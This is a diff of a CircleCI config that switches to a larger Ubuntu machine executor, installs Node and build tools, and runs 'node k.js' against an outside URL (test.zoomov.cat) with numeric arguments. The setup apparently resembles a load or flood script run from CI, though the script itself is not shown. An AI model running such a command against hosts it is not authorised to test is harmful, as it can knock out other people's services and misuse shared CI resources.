@@ -2,16 +2,19 @@ version: 2.1
 
 jobs:
   build-and-run:
-    docker:
-      - image: cimg/node:20.5  # Node.js + basic build tools
+    machine:
+      image: ubuntu-24.04
+      resource_class: xlarge  # 8 cores, 16 GB RAM. Use 2xlarge for 16 cores
     parameters:
       job-number:
         type: integer
     steps:
       - checkout
       - run:
-          name: Install GCC (if needed)
-          command: sudo apt-get update && sudo apt-get install -y gcc
+          name: Install dependencies
+          command: |
+            sudo apt-get update
+            sudo apt-get install -y nodejs npm gcc build-essential
       - run:
           name: Run Node script
           command: node k.js https://test.zoomov.cat 200 10 60 3
